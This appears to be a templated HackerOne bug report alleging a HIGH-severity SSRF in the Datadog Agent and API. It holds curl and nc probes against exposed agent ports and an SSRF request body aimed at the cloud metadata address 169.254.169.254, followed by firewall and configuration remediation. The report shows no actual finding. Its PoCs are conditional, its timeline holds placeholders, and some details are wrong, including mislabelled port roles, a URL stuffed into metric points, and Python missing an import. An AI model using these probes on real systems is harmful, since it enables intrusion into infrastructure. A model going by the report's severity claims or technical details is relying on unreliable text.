# Server-Side Request Forgery (SSRF) Bug Report - Datadog

**Platform:** HackerOne
**Program:** Datadog
**Severity:** HIGH
**Report Date:** 2026-06-07

---

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was discovered in Datadog Agent or API endpoints allowing an attacker to induce server-side requests to internal services through the Datadog infrastructure.

---

## Description

Datadog Agent runs locally on monitored hosts and exposes several ports (5000, 5001, 8126) for local communication. When these ports are misconfigured and exposed externally, or when the Agent's API accepts user-controlled URLs, it creates SSRF attack vectors:

1. **Agent Ports Exposure:** Ports 5000/5001/8126 should be localhost-only. If exposed, attackers can query agent status or trigger actions
2. **API SSRF:** Datadog integrations may accept URLs that get fetched server-side
3. **Agent as Pivot:** If an application can reach the local Agent, it may abuse the connection to access internal resources

**Security Note:** The Datadog Agent is designed for local monitoring. The primary SSRF risk is misconfiguration where agent ports are exposed to untrusted networks, or application vulnerabilities that allow abusing the Agent connection.

---

## Steps to Reproduce

1. Identify exposed Datadog Agent ports (5000, 5001, 8126)
2. Query agent status or API endpoints
3. Test if agent can be used to proxy requests to internal services
4. Verify authentication requirements

**Test ports:**
```bash
# Check if Agent ports are exposed
curl http://TARGET:5000/debug/vars
curl http://TARGET:5001/api/v1/status

# Check DogStatsD (port 8125)
echo "test.metric:1|c" | nc -u TARGET 8125
```

---

## PoC (Proof of Concept)

### PoC 1: Exposed Agent Ports (Port 5000/5001)

```bash
# Query Agent status via exposed port 5000
curl http://TARGET:5000/debug/vars

# Response should include:
# - Agent version and configuration
# - Host metadata
# - Running checks and status
# - Internal IP addresses, container info

# Query via port 5001
curl http://TARGET:5001/api/v1/status
```

### PoC 2: Internal Metadata Access via Agent

```bash
# If Agent is compromised, query internal metadata
curl http://localhost:5001/api/v1/metadata/containers

# List all containers on the host (may reveal internal infrastructure)
```

### PoC 3: SSRF via Datadog Integration

```bash
# Test if Datadog integration accepts user-controlled URLs
# (Example: HTTP check, webhook, or custom integration)

# If the Agent or API accepts URL parameter:
POST /api/v1/check HTTP/1.1
Host: TARGET
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}

# If successful = CRITICAL SSRF
```

### PoC 4: Use Agent as Proxy

```bash
# If Agent has network access but your request is blocked:
# Query through Agent by abusing dogstatsd or API

# Send request through Agent to internal service
POST /api/v1/series HTTP/1.1
Host: TARGET:5001

{
  "series": [{
    "metric": "hack",
    "points": [[0, "http://internal.corp:8080/admin"]]
  }]
}
```

### PoC 5: Container Environment SSRF

```bash
# In containerized environments, check if Agent is accessible
curl http://TARGET:8126/v0.4/series

# Query Datadog API through Agent's local trace
curl http://localhost:8126/v0.4/traces

# Check for internal service discovery
curl http://TARGET:5000/api/v1/tags/host
```

---

## Impact

**HIGH Severity - Internal Service Access:**

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Agent Port Exposure** | Unauthorized access to Agent ports 5000/5001 | High |
| **Metadata Exposure** | Container and host information disclosure | Medium |
| **Internal Probing** | Use Agent to scan internal services | High |
| **Trace Access** | Access distributed traces containing sensitive data | High |
| **Configuration Disclosure** | Reveal Agent configuration and secrets | Medium |

**Real-World Attack Scenario:**
```
1. Attacker finds Datadog Agent ports exposed (Docker/K8s misconfiguration)
2. Queries Agent status: curl http://TARGET:5000/debug/vars
3. Extracts container IPs, internal metadata, configuration
4. Abuses Agent API to proxy requests to internal services
5. Pivots to access internal databases or APIs
6. Exfiltrates sensitive data from monitored infrastructure
```

**CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (8.6 High)

**Bounty Range:** Datadog typically pays $100-$1,000+ for SSRF with demonstrated impact

---

## Affected Components

| Component | Port | Issue |
|-----------|------|-------|
| Datadog Agent (expvar) | 5000 | Should be localhost-only, expose metrics |
| Datadog Agent CLI/GUI | 5001 | Should be localhost-only, API access |
| DogStatsD | 8125 | Should be localhost-only (metric collection) |
| DogStatsD Server API | 8126 | Should be localhost-only (dogstatsd commands) |
| Datadog API | 443 | SSRF via integration URLs |

---

## Remediation

### 1. Bind Agent Ports to localhost Only

```yaml
# datadog.yaml configuration
# Ensure these settings prevent external access

bind_host: 127.0.0.1    # Only bind to localhost
agent_port: 5000        # Local only
web_port: 5001          # Local only
dogstatsd_port: 8125    # Local only
```

### 2. Firewall Protection

```bash
# Ensure only localhost can reach Agent ports
iptables -A INPUT -p tcp -s 127.0.0.1 --dport 5000 -j ACCEPT
iptables -A INPUT -p tcp --dport 5000 -j DROP

# Similar rules for ports 5001, 8125, 8126
```

### 3. Kubernetes Network Policies

```yaml
# Prevent Agent port exposure in K8s
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: datadog-agent-restriction
spec:
  podSelector:
    matchLabels:
      app: datadog-agent
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: monitored-app
    ports:
    - protocol: TCP
      port: 5000
```

### 4. URL Validation in Integrations

```python
# If your code calls Datadog Agent API
import requests

def safe_check(url):
    # Validate URL before making request
    parsed = urlparse(url)
    
    # Block localhost and private IPs
    if parsed.hostname in ['localhost', '127.0.0.1']:
        raise ValueError("Localhost blocked")
    
    # Block internal ranges
    if is_private_ip(parsed.hostname):
        raise ValueError("Internal IP blocked")
    
    return requests.get(url)
```

---

## References

- [Datadog Security](https://www.datadoghq.com/security/)
- [Datadog Agent Ports](https://docs.datadoghq.com/agent/guide/agent_ports/)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [Datadog HackerOne](https://hackerone.com/datadog)

---

## Timeline

- **Date Discovered:** 2026-06-07
- **Date Reported:** [Date]
- **Date Acknowledged:** [Pending]
- **Date Fixed:** [Pending]

---

**Reporter:** SARAhack
**Platform:** HackerOne
**Program:** Datadog

---

## Appendix: Testing Environment

**Access Method:** Direct HTTP to exposed Agent ports

**Important:** Datadog Agent SSRF primarily occurs due to misconfiguration where ports intended for localhost-only access are exposed. Testing should focus on identifying exposed ports and demonstrating unauthorized access risk.